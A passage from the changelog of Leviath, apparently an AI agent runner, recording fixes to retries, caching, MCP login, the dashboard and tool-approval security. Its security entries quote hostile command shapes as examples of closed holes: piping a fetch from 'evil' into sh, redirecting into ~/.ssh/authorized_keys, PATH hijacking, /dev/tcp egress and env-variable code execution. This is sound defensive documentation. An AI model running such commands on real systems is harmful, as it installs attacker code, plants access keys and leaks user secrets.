  by a cumulative ceiling so a run can never wait forever. An ordinary server
  error keeps the old fast schedule.
- Added: `[limits] inference_retry_attempts` and `inference_retry_base_ms` set
  the inference retry schedule. Both default to what Leviath already used, so
  nothing changes until you set them; raising the attempt count is the lever
  for riding out a longer outage.
- Changed: a structured agent's volatile context regions are cached in two
  pieces rather than one. A provider that spends a cache breakpoint per run of
  same-hint blocks gave the whole volatile tier a single entry, so mutating any
  region in it re-billed every region behind it as a cache write. The blocks
  ahead of the most recent change are now hinted separately, which puts them in
  an entry of their own. Nothing about what the model reads changes: block order
  and text are untouched, and the request stays within the four cache
  breakpoints Anthropic allows.
- Changed: for anyone using the crates as libraries,
  `ProviderError::RateLimitExceeded` now carries the provider's `Retry-After`
  value and so is a struct variant. Code that matches on that variant needs
  updating; its displayed message is unchanged.
- Fixed: the dashboard's Output pane shows a run's final output. A stage that
  submits its result through `submit_output` writes the `final_output` record
  rather than a stage output log, so the pane said "No output yet" for exactly
  the stage that produced the answer.
- Added: the dashboard can act on several runs at once. `space` marks or
  unmarks the selected run, marked rows carry a check with a count in the pane
  title, and `x`/`d` kill or delete every marked run behind one confirm
  dialog. Nothing changes visually until the first mark.
- Changed: labels say Agent Runs when they mean runs and Agent Blueprints
  when they mean blueprints. The dashboard's run list is titled Agent Runs
  with a Blueprint column, the new-run picker is titled Agent Blueprints,
  `lev ps` answers "no agent runs active", and `lev list` offers to install
  agent blueprints.

## 0.3.6 - 2026-08-13

- Fixed: adding an MCP server that authenticates with a header no longer chases
  an OAuth login it cannot complete. `lev mcp add --header "Authorization=..."`,
  `lev mcp login`, and the browser console's login button all ended in
  `failed to fetch resource metadata: HTTP 404 Not Found`, while the header
  itself worked the whole time. Leviath now asks the server whether it wants
  credentials before starting a flow, and says so when it does not.
- Fixed: `lev mcp add --arg -y` was rejected as an unknown flag. The arguments
  after `--arg` belong to the server's command line, not to `lev`, so the
  documented way to add a stdio server (`npx -y <package>`, which is how most
  MCP servers are published) failed at the first command.
- Fixed: OAuth discovery finds the metadata document for a server hosted at a
  path. RFC 9728 puts it at `/.well-known/oauth-protected-resource/<path>`;
  Leviath dropped the path and asked for the bare well-known URL, which such a
  server does not serve. A server that sends a `resource_metadata` hint was
  unaffected, which is why this went unnoticed.
- Fixed: a `${VAR}` credential in an MCP header is expanded everywhere it is
  used. The login probe sent the reference literally, so a server that checks
  the value refused it and Leviath concluded an OAuth login was needed; the
  Test action in the dashboard and over the API refused the variable outright,
  so a server that worked for an agent failed its own test.
- Changed: `lev mcp list` reports a server holding a configured `Authorization`
  header as `header` rather than `none`. Reading as unauthenticated is what
  pointed people at a login that does not apply.

## 0.3.5 - 2026-08-12

- Fixed: the fan-out agents no longer skip their own fan-out. A
  `wide-researcher` run finished "complete" having run only its first stage:
  the escape edge every stage carries for the out-of-revisits case was a plain
  transition, so it sat on the menu every turn and the model took it on the
  first one. Ten such edges across six agents are now `condition = "dead_end"`,
  which the engine consults only when nothing else can be followed. **If you
  have these blueprints installed, `lev setup` (or `lev update`) reinstalls
  them; an edited copy is left alone and keeps the old behaviour.**
- Fixed: a title from a reasoning model is the title rather than the reasoning.
  Those models answer after thinking out loud, so the first line is prose about
  the task, and that is what got stored and displayed.

- Fixed: runs get their generated titles. Every run showed its raw task text
  instead, which is what the dashboard falls back to when there is no title.
  The titling call put its instruction in a message with `role: "system"`,
  which every OpenAI-shaped provider accepts and Anthropic's Messages API
  rejects with a 400, and Anthropic is the default for every blueprint Leviath
  ships. The failure was invisible: a failed title is deliberately not worth
  interrupting a run for, the reason went to a debug log, and the daemon's
  output goes to /dev/null. `lev ps` also grows a TITLE column, because the
  listing the daemon returns had no title field at all - the dashboard and the
  HTTP API read titles from disk and always could, once there were any.
- Changed: the dashboard's help lists every key. Six modes had no entry at all
  (the new-run screen, the stage explorer, the log panel, confirm dialogs, the
  MCP add form, and both search modes), `n` was undocumented, and several
  entries described keys that do something else. The overlay scrolls now,
  which it had to: it was a fixed paragraph, so on a short terminal the detail
  view's help already stopped part way down with nothing to say there was
  more. F1 opens it as well as `?`, for the screens where `?` is text.
- Added: unattended runs from the dashboard, with Ctrl-Y on the new-run
  screen. The first use in a sitting warns, and says both what `--yolo` does
  and what it does not - it never skips checkpoints a blueprint asks a person
  for. "Don't ask again" holds until the dashboard closes and is never written
  to the config, and the setting itself resets every time the screen opens.
- Changed: starting a run from the dashboard opens that run's page rather than
  returning to the list, and Esc from it goes back to the list.
- Added: you can start a run from the dashboard. `n` on the main list opens a
  screen with the installed agents on one side (type to filter) and a task
  editor on the other, where `@` completes a path from the working directory
  the way a coding agent does. Until now the dashboard could watch, pause and
  cancel runs but not begin one, so the answer to "start another" was always
  another terminal.
- Fixed: `lev -v setup` no longer fills the wizard with debug text. The tracing
  layer writes to stderr, the wizard owns the alternate screen on stdout, and
  both are the same terminal, so a provider check under `-v` drew hyper and
  rustls lines straight into the frame. Raw mode staircased them and ratatui's
  cell diffing never painted over them, so the screen stayed broken until exit.
  Log lines are now buffered while a TUI holds the terminal and flushed to the
  scrollback when it lets go, including on the panic path. Also fixed next to
  it: the `.env` filter warned even when it had filtered nothing, printing
  `Ignoring  from .env` with a hole where a name belonged.
- Changed: every `lev setup` screen scrolls, so the wizard works at any window
  size. The tuning screen is thirteen two-line fields, and a twenty-row
  terminal showed twelve of them with nothing on screen to say the rest
  existed, the Continue button included. Page keys move the selection and the
  view follows it; below 24x6 the wizard says the window is too small rather
  than drawing half a frame.
- Changed: the tuning screen is now opt-in, from a toggle on Defaults. Every
  one of those limits already has a working default, so walking a first-time
  user through concurrency and retry ceilings taught them that setup is long
  rather than that Leviath is configurable. Skipping it changes nothing about
  what gets written.
- Changed: `lev setup` takes the mouse. The credential screen's actions (open
  the provider's key page, check the credential) are rows you can click or
  reach with the arrows, rather than `o` and `v` in a footer; clicking a
  provider selects it, and the wheel scrolls.
- Changed: the default provider and model are chosen from a searchable list
  that explains what the choice decides. The list is long and the field showed
  one line of it. More importantly, the field never said that a stage listing
  its own models keeps them, or that `default_provider` does nothing at all
  until `default_model` is also set. The model list's first option read
  `(provider default)`, which is not a thing: no provider default model is
  consulted at run time, and a stage naming no model falls back to one built
  into Leviath. It now reads `(each blueprint decides)`.
- Added: `lev update`, which updates Leviath with the installer that put it
  there and then offers to bring the bundled blueprints and the config along
  with it. The install method is read off the filesystem, not guessed from the
  version string: a Homebrew Cellar path carries the formula name and the
  formula carries the channel, so a beta install runs `brew upgrade
  leviath-beta` without being told, and Scoop works the same way. The install
  script keeps no record of the channel it used, so that arm defaults to
  `stable` and `--channel` is how you say otherwise. A `cargo install` is
  described rather than run, because updating it is a full compile.

  The blueprints and the config are checked every time, whatever the binary
  step did. `brew upgrade` on its own leaves both behind, so anyone who has
  ever updated that way is running blueprints from whenever they last ran
  `lev setup`, and a binary that needs no update is not a reason to stop
  looking.

  Nothing is written to your agents directory without a yes: the list is
  printed first and one confirmation covers it, with `--install-agents` for
  scripts. `--yes` alone does not install blueprints, because updating a binary
  and replacing your agents directory are different requests. A copy you edited
  is named as edited and asked about on its own, and no flag covers it.
  `--check` and `--json` report and change nothing; `--dry-run` walks the whole
  flow and performs none of it.

## 0.3.4 - 2026-08-12

- Changed: the bundled set is seven agents, not ten (#395). `software-engineer`
  merged into `coder`, which keeps the plan checkpoint and the discovery pass
  that grounds it; `writing-assistant` and `daily-briefer` are gone. **If you
  used any of the three, `lev setup` will not reinstall them: copy the blueprint
  out of an older release first, or keep the copy already in
  `~/.leviath/agents/` and it will keep running.** Two deliberate behaviour
  choices in the merge, both so `coder` stays usable unattended: its plan
  checkpoint resolves as approved under `--yolo` rather than parking the run,
  and its blocking tools are no longer in `required_tools`. Both are one line to
  reverse in your own copy.
- New: five of the seven agents fan out, covering several things at once instead
  of one after another (#395). `deep-researcher` and `wide-researcher` split
  into sub-questions and threads and run each as a full `researcher` sub-agent,
  so a thread gets its own clean context window rather than a share of the
  parent's; `reviewer` splits over files and hunk groups, `log-analyzer` over log
  files. Each keeps a direct edge for the narrow case, so one log file or a
  two-file diff does not pay for a fan-out it does not need.
- Fixed: an installed agent that will not load now says whether it is simply out
  of date (#395). A blueprint installed before a graph rule existed fails that
  rule, and the run reported `invalid blueprint` with nothing to suggest the
  file was old rather than wrong, which is what an alpha user hit on `coder`.
  Both `lev validate` and the spawn path now name it as the installed copy of a
  bundled agent and point at `lev setup`. The check compares the bytes on disk
  with the bundled ones rather than the `version` field, which routinely does
  not move when a blueprint does.
- Fixed: the published blueprint schema accepts `checklist` regions and
  `[stages.<name>.hooks]` (#393). Both parse, both are documented, and both were
  rejected by the schema Leviath publishes and points people at, so a blueprint
  using either failed to validate against the file it is told to validate
  against. The test that should have caught it only checked the bundled
  blueprints, none of which use either feature; it now reads the valid values
  out of the parser's own error message, so a new one cannot ship schema-less.
- Fixed: `config.example.toml` is published alongside the schemas (#393).
  Configuration links it, the publish step copied only `*.json`, and the check
  meant to catch a missing artifact listed only what the glob already caught, so
  the link had 404'd for its whole life. The docs publish also now fails when a
  channel has no search index rather than quietly serving title-only search.
- Fixed: `condition = "dead_end"` is in the published blueprint schema (#395).
  The parser accepted it and the `dead-end-possible` lint recommended writing
  it, while the schema Leviath publishes rejected it, so a blueprint following
  that advice failed to validate against the file it is told to validate
  against.

- New: `GET /api/agents/{id}/stages` serves a run's per-stage ledger - what each
  stage cost, the cache read/write split, `region_tokens`, and whether the stage
  was entered at all (#388). It was the one thing the runtime records per run
  that no route exposed, so a client over HTTP had to reconstruct it by diffing
  `context/history` snapshots: expensive, and blind to a stage that ran and
  wrote nothing to any region. Advertised as the `runs.stages` capability.

## 0.3.3 - 2026-08-11

- Changed: the outbound-request policy moved out of `leviath-core` into a new
  `leviath-net` crate. `leviath-core` describes itself as plain serializable
  data with no async dependencies and pulled a full HTTP client, so depending on
  Leviath's data types cost 123 crates; it now costs 68, and `leviath-scripting`
  and `leviath-agent-client` drop by the same amount. The `lev` binary is
  unchanged - it needs the client either way. Anything importing
  `leviath_core::{check_url, checked_client, client, client_builder,
  ClientTimeouts, UrlRejection, is_restricted_addr}` should import it from
  `leviath_net` instead.
- Fixed: `leviath-alloc` was missing from the crates.io publish list and the
  coverage matrix. It was added after the last publish and `leviath-cli` depends
  on it by version under a default feature, so the next stable release would
  have failed at `cargo publish -p leviath-cli`. `cargo xtask version --check`
  now refuses a workspace member that is absent from either list, so a release
  is no longer where that gets discovered.

- Fixed: a stage the run never entered is recorded `skipped`, not `complete`
  (#372). The ledger marked every stage positioned before the cursor complete,
  which is only the same thing in a linear blueprint: a graph reaches its stages
  in whatever order its edges describe, so every branch a run went past without
  taking was filed as having run, with an empty `region_tokens`. Since that map
  is a snapshot, an empty one in the middle of the sequence made the *next* real
  stage appear to have written every region from nothing - which is how a
  tool-less output stage came to look like it had written 153,983 tokens. Stage
  records also carry `entered`, so a consumer can tell the two apart without the
  "empty map means it did not run" heuristic.
- Breaking: a stage that routes a tool result into a region its own
  `[context.regions]` omits is refused by `lev validate` (#370). Omitting a
  region hides it, so the result was written where that stage could not read it
  - and the pointer left in `conversation` told the model to go and read it
  anyway. Measured on a scoped agent: a `verify` stage instructed to check rules
  against the documentation tried in 6 of 20 runs, and the manual landed out of
  view every time. The message names the region and how to fix it. The four
  regions the runtime always carries stay valid targets, and a stage that
  declares no layout of its own is judged against the blueprint's.
- Changed: when a result does land in a region the stage does not carry, the
  pointer says so instead of instructing the model to read it. The content is
  still stored, for a later stage that declares the region.
- Fixed: the null device is no longer treated as an escape from the workspace
  (#373). `read_file`/`write_file` and a Rhai script's file host functions
  answered `path '/dev/null' would escape the working directory`, which is both
  wrong - writing there writes nowhere - and unfixable from the agent's side,
  since no path inside the workspace means "discard this". Shell *redirects* to
  `/dev/null` were already allowed; this is the same rule applied to the paths
  that arrive as arguments. `/dev/stdout` and `/dev/stderr` stay refused for the
  file tools on purpose: opened by name they are the daemon's own streams, and a
  tool writing there would land in the middle of what the CLI is drawing.
- Changed: a refusal for a path outside the workspace names the workspace root
  and says to use a path inside it. "Denied" on its own sends an agent looking
  for a different way out, and the turns it spends doing that are charged to the
  stage's iteration budget.
- New: `gate = { require_regions = ["plan"] }` holds an edge until every named
  region has content, ANDed with the gate's other conditions (#371). `region`
  reads as though it says this and does not: it is one of several *alternative*
  ways to satisfy `require_modifications`, so a stage that wrote any file at all
  satisfied it with the named region still empty. That is the right shape for
  what `region` is for - a restart-durable stand-in for per-stage counters - and
  there was no way to express the conjunction.
- New: `flags.required_regions_abandoned` in `meta.json` names any
  `required = true` region a stage gave up on after its re-run budget (#371).
  The mechanism logged and recorded nothing, so a run whose agent wrote its plan
  and one where it was asked twice and moved on both finished `complete` with
  nothing to tell them apart. Its counterpart `flags.gates_forced` already
  counted forced transitions.
- New: `summarizable = false` on a region keeps an edge `transform = "compact"`
  from handing it to the summarizer (#369). A bare `compact` reads as
  "summarize the transcript on the way out" and means "summarize every region
  that is not pinned", which includes the ones holding the run's results -
  figures that survive a paraphrase are no longer figures. The flag protects a
  region wherever it is used rather than at each of the N edges that might touch
  it, and it wins over an explicit `compact` list, saying so when it refuses
  one. `clear` is unaffected: this says "do not paraphrase my content", not
  "keep it forever".
- New: `lev validate` warns when a bare `compact` edge would summarize a region
  declared `required` - the closest thing a blueprint has to "this is a
  deliverable" - and names the flag that fixes it.
- Changed: an edge compaction that does not happen says why. It was dropped
  silently when the compaction provider was not registered or the pool had no
  permit, so a declared transform was advisory: the same blueprint corrupted its
  results only when a permit happened to be free, with no signal either way.

- Breaking: a blueprint value that is not one of the spellings a setting
  accepts is refused, naming what is valid. Four settings took anything and
  quietly used a default instead: `tool_permissions` values, `on_worker_failure`,
  an interaction point's `style`, and a sliding window's `strategy`. The first
  is the sharp one - anything unrecognised resolved to `ask`, so a misspelled
  `deny` produced a prompt where a refusal was written, and a prompt can be
  answered by a session grant or `--yolo`. The same typo in `config.toml` has
  always been refused, because that side deserializes into an enum; this closes
  the gap the other way round.
- Fixed: an unknown key in `config.toml` is reported wherever it sits, not only
  at the top level (#365). `[limits] max_concurrent_tool` used to be accepted in
  silence. Keys are now judged by asking serde - deserialize, serialize back,
  and report what did not survive - so this needs no list to maintain and stays
  right as fields come and go. It also leaves `[model_providers.<name>]` alone,
  which deliberately forwards unrecognised keys to a Rhai script.
- New: `lev doctor` reports the same unread keys, for when the start-up warning
  scrolls past, and names a `[rate_limits.<provider>]` entry whose provider does
  not exist - a case the key check cannot see, since that table accepts any name
  and a misspelled provider simply throttles nothing.
- New: a region named `stage_instructions` receives the entering stage's
  `system_prompt`, if a blueprint declares one (#366). Stage instructions have
  always been pinned context, but the region holding them was chosen by
  accident - whichever pinned region was declared first - so its tokens were
  charged to that region's name in the stage ledger, it could not be sized or
  scoped, and it sat wherever that region sat in the cacheable prefix. Measured
  on a two-stage agent: `task` reported 65 tokens where 63 of them were the
  stage prompt, and 2 were the task. Declared, the same run reports `task` 2 and
  `stage_instructions` 63. The region is also assembled after every other pinned
  block whatever order it was declared in, so the prefix in front of it is
  byte-identical across a transition rather than being rewritten at the head on
  every stage change. A blueprint that declares nothing by that name behaves
  exactly as before.

- Breaking: a blueprint key the parser does not read is now refused, naming
  what is valid, in `[stages.X]`, `[stages.X.context]`,
  `[stages.X.tool_routing]`, a transition edge and its `gate` (#362). The
  parser walks the TOML by hand, so anything it did not recognise was accepted
  and dropped: `lev validate` called the blueprint good and the only symptom
  was a stage behaving as though the line had not been written. That is worst
  for the features whose whole value is expressing intent precisely - an
  ignored gate is a review loop that never gates, which reads as the model
  behaving well. Region names are checked the same way: routing targets and
  gate targets must name a region some stage declares, and
  `require_no_open_items` must name a `checklist` region, since pointed at any
  other kind it can only ever count zero and pass on the first attempt.
- Breaking: `[stages.X.tool_routing.overrides]` accepts
  `tool = { region = "...", max_result_tokens = N }` as well as
  `tool = "region"`, and refuses anything else (#361). The table form parsed
  clean and did nothing - and cost more than an unsupported shape should,
  because the entry fell through the string-only match arm entirely, so the
  tool lost the region it named *as well as* the cap and landed in
  `default_region` uncapped. A non-integer or negative ceiling is now an error
  in both this table and `max_result_tokens_per_tool`, where it used to be
  skipped in silence.
- Fixed: a stage's `description` is read. Every bundled agent writes one,
  `Stage` had the field and a builder for it, and the manifest parser never
  looked at the key.
- Fixed: `checklist` is listed among the valid region kinds when a kind is
  misspelled. It has always parsed; a user who typo'd it was told it does not
  exist.
- Fixed: a top-level key in `config.toml` that nothing reads is named in a
  warning rather than ignored (#362). A warning and not an error on purpose:
  every command reads that file, so refusing to load it over one stale key
  would take the CLI down rather than the one thing the key was meant to
  affect.
- Fixed: an OpenRouter model's context window comes from OpenRouter, not from
  the table compiled into this build (#360, and the half of #337 that was left
  undone). The daemon reads `/models` once at start-up and uses the
  `context_length` it reports; the 128 000-token fallback now applies only to a
  model that neither the API nor the table describes. Region budgets are
  percentages of the window, so a `budget = "30%"` region on a 1M-token model
  was being sized at 38 400 instead of 314 572, silently. A
  `[model_capabilities]` entry still outranks both, and only the two sizes come
  from the API - whether a model accepts temperature or tools is about the
  shape of a request, which the compiled table is the only thing that knows.
  Reading it is bounded and never fatal: a provider that cannot answer in ten
  seconds keeps the built-in table and the daemon starts anyway.

## 0.3.2 - 2026-08-10

- Breaking: a run that required a final output and never produced one now ends
  as an error rather than `complete` (#339). The requirement gate forces past
  the obligation once its retries are spent, which is right - a later stage may
  still answer - but nothing downgraded the terminal status, so a run reported
  success with no `final_output` on disk while `lev result` exited non-zero on
  the same run. The output-retry budget is also no longer borrowed from the
  stage's `max_revisits`: those are different questions, and conflating them let
  a routing setting silently multiply an inference bill, since each retry
  re-sends the whole stage context and an output stage runs last.
- Breaking: `read_file` is capped at 256 KiB and says so in the result when it
  applies (#344). It had no bound at all, so a large file went into its region
  whole and was either truncated or dropped as `[result omitted]` depending on
  how full the region already was - a cliff rather than a limit. `shell` has
  been capped since it existed.
- Changed: a stage that omits a region from `[stages.X.context.regions]` now
  hides it rather than destroying it (#341). Omitted regions were dropped from
  the window, so re-declaring one downstream brought it back empty, and an
  author had to choose between carrying a large preview through every call of
  every stage and losing it. `conversation`, `tool_results` and `final_output`
  stay visible whatever a stage declares.
- New: `condition = "dead_end"` fires when the graph would otherwise strand -
  the stage finished and every normal edge's target has spent its
  `max_revisits` (#346). The alternatives were a plain edge to the output stage,
  which the model can take at the end of every visit (measured: pipelines
  collapsed in 10 of 24 runs of one agent and 21 of 36 of another), or nothing,
  which kills the run with everything it established. `lev validate`'s
  `dead-end-possible` now counts what the runtime actually consults and stops
  recommending `condition = "max_iterations"`, which never fires on that path
  (#340).
- New: a `checklist` region kind whose items carry state, with `todo_add`,
  `todo_done` and `todo_note`, and a `require_no_open_items` gate (#342). A
  pinned region plus `context_append` gives persistence and no state: "compute
  the fee table" and "~~compute the fee table~~ done" are two different strings,
  so nothing could count what was left and no gate could ask.
- New: `gate = { require_region_updated = "plan" }` requires a region to have
  *changed* during the stage rather than merely to exist (#343). Every other
  gate can be satisfied by re-emitting what was already written, so a reviewer's
  rejection could be answered with the same plan until the stage ran out of
  revisits.
- New: `lev stages <run-id>` prints the per-stage token ledger, with
  `--regions` for each stage's per-region high-water marks (#347). The ledger
  has existed for a while with no CLI reader. It also now records
  `cache_write_tokens`, without which a stage showing no cache reads could not
  be told apart from one paying to write a prefix nothing reuses, and Leviath
  warns once when a stage's per-call prompt passes four times its first call -
  the shape of a region accumulating without a cap.
- Fixed: a `[model_capabilities]` entry naming only the field you want to change
  was silently dropped (#338). Entries are now merged onto the provider's own
  answer for that model, so `max_context_tokens = 1048576` on its own works and
  leaves everything else alone. A misspelled key is refused rather than ignored.
- Fixed: an OpenRouter model this build's table does not name was silently given
  a 128 000-token window (#337). Percentage region budgets resolve against that,
  so a `budget = "30%"` region on a 1M-token model was sized at 38 400 instead
  of 314 573. It now warns once per model, naming the assumed window and the
  line that corrects it.
- Fixed: an Anthropic cache breakpoint landing on a tool turn consumed budget
  and wrote nothing (#345). In an agent run nearly every message is a tool turn,
  and the breakpoint is chosen by index, so the slot was usually spent on a
  message that could not carry it - measured against the API, the difference
  between no cache at all and a 4 458-token prefix. `[providers]
  anthropic_cache_ttl = "1h"` also makes the extended TTL reachable; it was
  implemented with no way to select it.
- Fixed: `lev list --filter` was declared, parsed and never read, so every
  spelling printed the same thing, and an unknown value was accepted in silence
  (#327). It now filters, and clap rejects a spelling it does not know.
- Fixed: `o3` and `o4` could not run at all through the `openai` provider (#335).
  A model declaring no temperature support was sent `temperature: 0.0` rather
  than having the field left out, and the o-series accepts only its own default,
  rejecting `0.0` as firmly as any other value - so the one flag that exists to
  protect those models was what broke them. The field is now omitted, which is
  what the OpenRouter provider has always done for the same models.

## 0.3.1 - 2026-08-09

- Fixed: tool-using agents could not run on OpenAI's current reasoning models
  (#333). Those models apply a reasoning effort by default and reject function
  tools alongside one on `/v1/chat/completions`, so every such run failed on its
  first inference over a field Leviath never set. It now retries once with
  `reasoning_effort: "none"` when the API says that is the remedy, and remembers
  the model so later calls in the same process pay nothing. Keyed on what the
  API reports rather than on a list of model names, since an out-of-date model
  list is what broke this. Models that reject the field outright, or reject the
  value `none`, are untouched: neither ever sees it. A `reasoning_effort` you set
  yourself in `[model.parameters]` is left exactly as written.

## 0.3.0 - 2026-08-08

- **Security.** `uniq`, `tree` and `rg` are no longer on the default safe-command
  list. Each violated the rule that list states about itself - an entry "must
  not be able to write a file, execute another program, or open a network
  connection under any flag". `uniq IN OUT` writes its second operand, `tree -o`
  writes a file, and `rg --pre` runs an arbitrary command over every input file.
  The escapes are positional or unbounded, so no flag check could catch them.
  Add any of them back by name in `[safe_commands] shell` if you want them
  unprompted. `git diff --output=FILE` writes too, but read-only git is common
  enough to keep: a `git` command carrying `--output` now prompts instead.
- **Security.** A Rhai script tool's `shell()` did not answer to the `write_file`
  policy, so an agent shipping its own `.rhai` tools could redirect a write past
  a `write_file = "deny"`. A `tools` entry in `[safe_commands]` spelled with the
  `shell:` prefix bypassed the validation the `shell` list gets, and could
  pre-approve a write. `/dev/tty` was treated as a discarded write when it is the
  user's actual terminal, and `<>` was treated as a read when it opens the target
  read-write. The MCP transport followed cross-origin redirects carrying its
  configured secret headers. `.env` filtering now also refuses
  `GIT_EXTERNAL_DIFF` and its family (`git status` is safe-listed, so a cloned
  repository could get unprompted execution from it), `BASH_ENV`, the pagers, and
  the language-runtime loaders.
- A `.env` value ending in a backslash silently discarded every variable after it
  when filtering was in play. Fixed.
- **Security.** A bundle that failed validation left its files on disk. `lev add`
  extracted straight into the destination and only then checked for symlinks, so
  a refused bundle's symlinks stayed there and `discover_blueprints` would list
  the half-extracted tree as a runnable agent - and a failed *re-install* left a
  working agent half-overwritten. Bundles now unpack into a staging directory
  and are moved into place only after passing every check, so a refusal leaves
  nothing behind and a working install survives a bad update.
- Provider HTTP clients no longer follow a redirect off the origin the API key
  was meant for. reqwest strips `Authorization` across origins on its own but
  not a custom header, and the provider keys travel as `x-api-key` and
  `x-goog-api-key`. Same-origin redirects are still followed, up to five hops.
- A corrupt run archive is an error rather than an allocation. A crash-truncated
  frame could leave a garbage 64-bit length prefix, which the reader took at its
  word - during daemon recovery, the one moment the lenient reader exists to keep
  working. It now folds back to the last intact record.
- The control socket caps how much one connection may send. On Unix the peer is
  already same-uid and token-authenticated; on Windows the named pipe carries a
  default DACL, which made an unbounded read a pre-auth allocation.
- **Security.** A shell tool inherited the daemon's entire environment, so every
  `shell` call, Rhai `shell()` and command seed could see `ANTHROPIC_API_KEY`,
  `GITHUB_TOKEN`, `LEVIATH_API_TOKEN` and whatever else the person who started
  the daemon had exported - one `env` in tool output leaked the lot, and a script
  with `shell` was a way around the `env_var` gate. New `[security] shell_env`
  decides what a child sees, defaulting to `filtered`: credential-shaped names
  are withheld, `SSH_AUTH_SOCK` is deliberately kept so `git push` over agent
  keys keeps working, and every toolchain variable (`PATH`, `CARGO_HOME`,
  `JAVA_HOME`, `VIRTUAL_ENV`, `NVM_DIR`, `GOPATH`, `DOCKER_HOST`) passes
  through. `strict` drops the `SSH_AUTH_SOCK` carve-out and also withholds
  `AWS_PROFILE`, `KUBECONFIG` and friends; `custom` withholds exactly what
  `shell_env_withhold` names and infers nothing; `inherit` is the old behaviour.
  `allow_env_vars` hands a specific name over under every mode.
  This is defence in depth against accidental leakage rather than a boundary: a
  granted shell can still `cat ~/.leviath/config.toml`. Use `[sandbox]` for a
  boundary.
- **Security.** An installed blueprint could pre-approve a tool you had never
  configured, which is the normal state for most tools - nobody writes
  `shell = "ask"` into their config, since that is already the default. So a
  downloaded `agent.leviath` could give itself `shell = "allow"` on a stock
  machine, contradicting the guarantee SECURITY.md and four other pages made.
  A blueprint may now raise a tool no higher than the built-in default unless
  you configured that tool yourself, with one named exception: `web_search` and
  `web_fetch`, which read-only research agents pre-approve and which can neither
  write nor execute. That exception is exactly what the ten bundled agents need,
  so none of them changes behaviour. To go further, name the tool under
  `[agent_tool_permissions.<agent>]`, or set the new
  `[security] allow_blueprint_permissions` for every agent.
- **Security.** A blueprint's `seed = { command = "..." }` runs a host command at
  spawn, before the first inference and therefore before any approval prompt
  exists. It now has to be covered by `[safe_commands]` as well as
  `allow_seed_commands`, because a seed is precisely the case where there is
  nobody to ask. The shipped agents seed with `git ls-files`, which is a default
  safe entry, so they are unaffected; a downloaded manifest no longer gets to
  run `curl … | sh` at spawn. `lev validate` now says per seed whether it is
  pre-approved or will be refused, so this is a one-line config fix found before
  the run rather than a region that silently came up empty during it.
- **Security.** A hostile MCP server could redirect Leviath's credentials to a
  host of its choosing. A legacy HTTP+SSE server announces where to POST through
  an `endpoint` event, and joining an *absolute* URL onto the base replaces the
  base entirely - so every later request, each carrying the OAuth bearer and any
  configured secret headers, went wherever the server said. The endpoint must
  now share an origin with the server you configured; a relative path or the
  server's own absolute URL still works. Leviath also warns when an MCP server
  URL is plain `http://` to a non-loopback host, since its credentials travel in
  cleartext.
- **Security.** A `.env` in a cloned repository could replace Leviath's entire
  configuration. `Config::load` read `./.env` into the process environment
  before resolving the config path, and `LEVIATH_CONFIG_PATH` is normally unset,
  so one line in a repository you cloned pointed the next statement at a config
  file of its choosing - its `[mcp_servers]` commands, its `[tool_permissions]`,
  its provider `base_url`. Credentials still load, since that is what `.env`
  support is for; the names that steer the process are ignored with a warning
  naming them: the `LEVIATH_` namespace, `PATH`, `SHELL`, `EDITOR`, `VISUAL`,
  and `LD_*` / `DYLD_*`. A variable you exported yourself still wins over the
  file, as before.
- **Security.** `lev serve --no-remote-yolo` refused `{"yolo": true}` on a
  spawn request but not `{"allow": ["*"]}`, which reaches the same wildcard
  override by another name. Both are refused now, as is any named `allow`:
  `{"allow": ["shell"]}` is not meaningfully weaker on a server somebody
  deliberately hardened. A caller who needs a per-agent grant has
  `[agent_tool_permissions.<agent>]` in the operator's own config.
- **Security.** A shell redirect was invisible to the approval machinery, so
  `write_file = "deny"` was bypassable with `echo x > file`. The redirect target
  never reached a grant key, which meant `cat notes.md > ~/.ssh/authorized_keys`
  keyed a bare `cat` - and `cat` ships as safe, so the default configuration
  wrote arbitrary files with no prompt, in direct contradiction of the rule the
  safe list states about itself. A shell call that writes is now held to the
  `write_file` policy as well as the shell's own, and each target is its own key
  (`>/tmp/out`), so an approval names what is being written and covers only
  that. A write cannot be pre-approved in a config file at all: `[safe_commands]
  shell` rejects any entry beginning with `>`.
  Writes that keep nothing still cost nothing - `/dev/null` and the standard
  streams, descriptor duplications like `2>&1`, and read redirects - so
  `cargo build > /dev/null 2>&1` is as quiet as it was. Two shapes can never be
  granted: a target that only exists after expansion (`> $OUT`), and bash's
  `> /dev/tcp/host/port`, which is a socket rather than a file and so an egress
  channel no program name in the line describes.
- **Security.** A shell command could reach the safe list under a name that did
  not describe what it ran. `PATH=/tmp/evil ls` keyed a bare `ls`, and `ls` ships
  as safe, so it ran a binary of the caller's choosing with no prompt; the same
  hole was reachable through `export`, `unset`, `declare`, `trap`, `function` and
  `alias`, each of which contributed no key at all while deciding what a later
  program in the line resolved to. A grant key now names every variable a line
  binds, spelled `env:NAME`, and a line that installs code to run later
  (`trap`, `function`, `alias`, `unalias`) cannot be pre-approved at all.
  Two visible consequences: `FOO=1 cargo test` prompts once per run until
  `env:FOO` is granted, and `set -euo pipefail` is unaffected, since shell
  options change nothing about which program a name resolves to. Grant an
  assignment the same way as a program, with `[safe_commands] shell =
  ["env:RUST_LOG"]`. Granting one variable grants exactly that one, and no
  program name widens onto an `env:` key.
- Approving tool calls no longer means approving one per shell invocation.
  Replaying a real 224-call run through the shipped approval machinery needed 46
  prompts; the same replay now needs 16. Three things changed. The parser that
  decides what a grant covers is quote-aware and no longer truncates a command
  line at its first redirect, which was both a soundness hole (a grant covered
  programs after the redirect that the user never saw) and the reason keys like
  `shell:Could not` and `shell:for i` existed. `[safe_commands]` adds an
  argument-scoped middle between "prompt on every `ls`" and "no prompt on
  `curl evil | sh`", shipped with a read-only verb list that is on by default.
  And the context tools, which write the agent's own context regions rather than
  the filesystem, no longer prompt at all.
- An approval now has three scopes rather than two: once, for this stage, and
  for this run. Each option names what it grants ("Allow git status, ls for this
  stage") instead of saying "for this session" and leaving the user to guess,
  and a call with nothing reusable to grant says so rather than offering a scope
  the dispatcher would silently drop. Nothing is written to disk; a grant dies
  with the run that made it. `session` stays the wire name for run scope, so
  `lev respond --session`, the REST `"scope": "session"` and the ACP
  `allow-always` option are unchanged.
- Fixed: a grant used to skip policy resolution entirely, so a grant made under
  one stage survived into a later stage whose `tool_permissions` denied the
  tool. "A configured deny is terminal" now holds across a stage boundary.
- Fixed: an interaction point declaring `unattended = "ask"` that nobody
  answered was **approved** when the interaction timeout passed. An empty answer
  routed through the same branch as an ordinary approval, so `lev run --yolo` in
  CI waited an hour and then approved the plan nobody read and wrote code from
